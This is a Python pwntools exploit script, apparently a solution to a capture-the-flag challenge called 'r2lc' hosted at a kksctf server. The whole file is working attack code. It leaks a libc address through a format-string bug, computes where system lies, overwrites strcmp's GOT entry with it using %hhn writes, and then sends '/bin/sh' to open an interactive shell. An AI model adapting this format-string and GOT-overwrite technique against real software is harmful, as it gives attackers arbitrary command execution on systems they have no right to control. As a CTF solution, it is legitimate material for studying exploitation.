#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
# context(log_level="debug", arch="i386", os="linux")
if debug == 1:
    p = process('./r2lc')
    libc = ELF('/lib/i386-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('tasks.open.kksctf.ru', 10001)
    libc = ELF('./libc.so.6', checksec=False)
elf = ELF('./r2lc', checksec=False)
got_strcmp = elf.got['strcmp']
addr_main = 0x08048964
addr_change_user_name = 0x08048791

p.sendlineafter('Enter your name: ', 'binLep')
p.sendlineafter('Enter your age: ', '4')
p.sendline('')
p.sendlineafter('> ', '2')
p.sendlineafter('Enter new name: ', '%73$p')
p.sendline('')
p.sendlineafter('> ', '1')
p.recvuntil('name: ')
addr___libc_start_main = int(p.recv(10), 16) - 249
libcbase = addr___libc_start_main - libc.sym['__libc_start_main']
addr_system = libcbase + libc.sym['system']
success('addr_system = ' + hex(addr_system))

# gdb.attach(p, "b *0x08048805\nc")
p.sendline('')
p.sendlineafter('> ', '2')
off_1 = (addr_system & 0xff) - 12
off_2 = (addr_system >> 8 & 0xff) - 12
off_3 = (addr_system >> 16 & 0xff) - 12
pd = p32(got_strcmp)  # 4
pd += p32(got_strcmp + 1)  # 8
pd += p32(got_strcmp + 2)  # 12
pd += '%' + str(off_1) + 'd%1$hhn'
pd += '%' + str(0x104 - off_1) + 'd'
pd += p32(addr_change_user_name)
pd += '%' + str(off_2 - 0x08) + 'd%2$hhn'
pd += '%' + str(off_3 - (off_2 + 0x100 & 0xff)) + 'd%3$hhn'
p.sendlineafter('Enter new name: ', pd)
p.sendline('')
p.sendlineafter('> ', '2')
p.sendlineafter('Enter new name: ', '/bin/sh')
p.interactive()
